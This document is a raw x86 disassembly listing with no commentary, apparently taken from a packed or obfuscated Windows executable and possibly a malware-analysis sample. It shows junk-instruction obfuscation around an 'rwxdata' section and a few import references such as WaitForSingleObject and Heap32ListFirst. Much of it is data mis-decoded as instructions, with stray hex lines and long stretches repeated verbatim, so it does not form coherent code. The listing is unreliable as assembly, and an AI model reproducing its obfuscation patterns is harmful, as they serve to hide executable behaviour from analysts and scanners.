mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
adc dl dh
jmp rwxdata
push edi
shld si ax cl
rcr di 0xb
push ebx
rcr di cl
rcl esi cl
movsx esi bl
mov esi eax
ror di cl
mov edi edx
stc
mov dl 0x82
not dl
clc
mov dl 0x80
xor al ah
xor ebx ebx
insd
add [ eax + edi * 8 + 0x4246c89 ] bl
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
stc
cmc
mov [ esp ] 0x92
xchg [ esp ] esi
sbb si 0x6057
stc
dec esi
clc
mov [ esp + 0x4 ] ebp
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
lea esp [ esp + 0x8 ]
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
arpl [ eax + eax + 0x66 ] si
adc esi edx
btc ax 0x1
aaa
mov esi edi
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_515f9d
lea esp [ esp + 0xc ]
jb rwxdata
push 0xbec177bb
pushfd
pushfd
pushfd
lea esp [ esp + 0x10 ]
call sub_514aff
call sub_51499f
jmp sub_5158f7
push 0x6e35d4bf
pushfd
mov [ esp ] 0x18
push [ esp + 0x8 ]
retn 0xc
sub_515ff7
pushfd
pushad
stosb [ edi ]
pushfd
lea esp [ esp + 0x2c ]
jmp rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
jmp rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
jpe rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
